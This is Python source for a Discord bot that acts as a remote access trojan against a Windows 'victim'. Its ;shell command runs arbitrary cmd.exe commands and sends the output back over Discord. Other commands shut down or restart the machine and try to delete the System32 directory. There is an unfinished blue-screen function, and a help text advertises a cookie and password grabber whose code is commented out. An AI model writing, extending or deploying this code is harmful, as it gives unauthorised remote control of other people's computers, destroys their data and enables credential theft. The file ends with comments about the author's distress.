import discord
from discord.ext import commands
from discord import Intents
import subprocess
import os
import ctypes
#import modules.cookies as cumkies

intents = Intents.all() # can we go back to the days where there was no intents
bot = commands.Bot(command_prefix=';', intents=intents)

@bot.event
async def on_ready():
    print(f'i am {bot.user.name}')

#@bot.command()
#async def browser(ctx):
#    content = cumkies.main_func()  # get the content from main_func
#        
#    embed = discord.Embed(title="Cookies", description=content, color=discord.Color.blue())
#    await ctx.send(embed=embed) 

@bot.command()
async def cmds(ctx):
    embed = discord.Embed(title="Commands", description="Commands: \n`browser` - Grabs the Victim's cookies and passwords.", color=discord.Color.blue())
    await ctx.send(embed=embed)


current_directory = os.getcwd()

@bot.command()
async def shell(ctx, *, command):
    global current_directory  

    if command == "cd":
        await ctx.send(f"Current directory: {current_directory}")
    elif command.startswith("cd "):
        new_directory = command[3:]
        try:
            os.chdir(new_directory)
            current_directory = os.getcwd()
            await ctx.send(f"Changed directory to: {current_directory}")
        except FileNotFoundError:
            await ctx.send("Directory not found.")
    elif command == "ls":
        file_list = os.listdir(current_directory)
        await ctx.send(f"Files in directory: {', '.join(file_list)}")
    else:
        process = subprocess.Popen(command, shell=True, executable="cmd.exe", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if output:
            await ctx.send(f"Output:\n```\n{output.decode()}\n```")
        if error:
            await ctx.send(f"Error:\n```\n{error.decode()}\n```")

@bot.command()
async def bsod(ctx):    
    def raise_hard_error(error_code):
        ntdll = ctypes.WinDLL('ntdll.dll')
        ntdll.NtRaiseHardError(error_code, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))

@bot.command()
async def shutdown(ctx):
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    os.system("shutdown /r /t 1")

@bot.command()
async def sys32(ctx):
    os.system("del C:\Windows\System32")


if __name__ == "__main__":
    with open('token.txt', 'r') as file:
        bot_token = file.read().strip()
    bot.run(bot_token)

# i hate programming so much 
# maybe it wouldn't be so bad if mr sertraline would work!
# i'm going to go and cry now
